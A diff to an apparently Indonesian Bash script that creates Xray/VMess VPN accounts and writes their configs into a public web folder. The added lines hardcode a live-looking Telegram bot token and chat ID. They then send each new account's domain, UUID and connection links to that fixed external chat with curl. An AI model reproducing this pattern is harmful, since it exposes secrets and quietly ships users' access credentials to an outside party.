@@ -12,6 +12,11 @@ CYAN='\033[0;36m'
 LIGHT='\033[0;37m'
 # ==========================================
 # Getting
+export CHATID="923915481"
+export KEY="6100820648:AAH6m5Zo9P3X9CEAzUYjazrCac4g1tFa45A"
+export TIME="10"
+export URL="https://api.telegram.org/bot$KEY/sendMessage"
+clear
 MYIP=$(wget -qO- icanhazip.com);
 IZIN=$( curl https://anuy639.github.io/izin | grep $MYIP )
 echo "Memeriksa Hak Akses VPS..."
@@ -90,6 +95,119 @@ rm -rf /etc/xray/vmess-$user-tls.json
 rm -rf /etc/xray/vmess-$user-nontls.json
 systemctl restart xray.service
 service cron restart
+
+cat >/var/www/html/vmess-$user.txt <<-END
+
+====================
+BZ TUNNELLING
+====================
+wa.me/6287728411949
+t.me/anuybazoelk
+====================
+# Format Vmess WS TLS
+
+- name: Vmess-$user-WS TLS
+  type: vmess
+  server: ${domain}
+  port: 8443
+  uuid: ${uuid}
+  alterId: 0
+  cipher: auto
+  udp: true
+  tls: true
+  skip-cert-verify: true
+  servername: ${domain}
+  network: ws
+  ws-opts:
+    path: /vmess
+    headers:
+      Host: ${domain}
+
+# Format Vmess WS Non TLS
+
+- name: Vmess-$user-WS Non TLS
+  type: vmess
+  server: ${domain}
+  port: 80
+  uuid: ${uuid}
+  alterId: 0
+  cipher: auto
+  udp: true
+  tls: false
+  skip-cert-verify: false
+  servername: ${domain}
+  network: ws
+  ws-opts:
+    path: /vmess
+    headers:
+      Host: ${domain}
+
+====================
+ Link Akun Vmess                   
+====================
+Link TLS         : 
+${xrayv2ray1}
+====================
+Link none TLS    : 
+${xrayv2ray2}
+====================
+
+END
+if [ ! -e /etc/vmess ]; then
+  mkdir -p /etc/vmess
+fi
+
+if [ -z ${Quota} ]; then
+  Quota="0"
+fi
+
+c=$(echo "${Quota}" | sed 's/[^0-9]*//g');
+d=$(( ${c} * 1024*1024*1024 ));
+
+if [[ ${c} != "0" ]]; then
+echo "${d}" > /etc/vmess/${user}
+fi
+DATADB=$(cat /etc/vmess/.vmess.db | grep "^###" | grep -w "${user}" | awk '{print $2}')
+if [[ "${DATADB}" != '' ]]; then
+  sed -i "/\b${user}\b/d" /etc/vmess/.vmess.db
+fi
+echo "### ${user} ${exp} ${uuid}" >>/etc/vmess/.vmess.db
+clear
+CHATID="$CHATID"
+KEY="$KEY"
+TIME="$TIME"
+URL="$URL"
+TEXT="<code>====================</code>
+<code>      XRAY/VMESS</code>
+<code>====================</code>
+<code>Remarks   : ${user}
+Domain    : ${domain}
+Port TLS  : 8443
+Port NTLS : 80
+id        : ${uuid}
+alterId   : 0
+Security  : auto
+network   : ws
+Path      : /
+Name      : vmess-grpc</code>
+<code>====================</code>
+<code> VMESS WS TLS</code>
+<code>====================</code>
+<code>${xrayv2ray1}</code>
+<code>====================</code>
+<code>VMESS WS NO TLS</code>
+<code>====================</code>
+<code>${xrayv2ray2}</code>
+<code>====================</code>
+<code>====================</code>
+Format OpenClash : https://${domain}:81/vmess-$user.txt
+<code>====================</code>
+Dibuat Pada    : $hariini
+Berakhir Pada  : $exp
+<code>====================</code>
+"
+
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
 echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
 echo -e "\E[44;1;39m		⇱ XRAYS/VMESS ⇲          \E[0m"
